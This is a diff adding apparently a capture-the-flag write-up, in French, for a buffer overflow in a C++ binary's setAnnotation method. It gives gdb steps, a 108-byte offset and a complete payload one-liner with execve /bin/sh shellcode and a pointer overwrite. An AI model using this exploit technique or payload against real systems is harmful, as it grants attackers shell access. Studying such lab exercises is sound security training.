@@ -1,0 +1,37 @@
+pattern gen: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+Overflow a +108
+
+
+Explication payload:
+
+   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
+   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+
+>b *0x0804867c
+> i r
+> x $eax
+dereference esp+10 dans eax = endroit de l'overflow
+ni
+etc.
+on voit ou sont les donnees
+avec les dereferencement on fait pointer la ou on veut pour qu'a la fin, edx=adresse du shellcode
+
+shellcode pour execve /bin/sh: http://shell-storm.org/shellcode/files/shellcode-575.html
+
+0804a00c = debut du payload
+[0804a00c+4 pour pointer sur le shellcode juste apres] [shellcode pointe par 0804a00c+4] [padding de 83 jusqu'au 0804a00c+108] [0804a00c (pointeur sur le debut du payload)]
+
++4 = \x08\x04\xa0\x10
+
+shellcode = \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+
+padding = A*83
+
++0 = \x08\x04\xa0\x0c
+
+payload = $(python -c "print '\x08\x04\xa0\x10'[::-1] + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A'*83 + '\x08\x04\xa0\x0c'[::-1]")
+
+
+en gros, ne pas memcpy betement
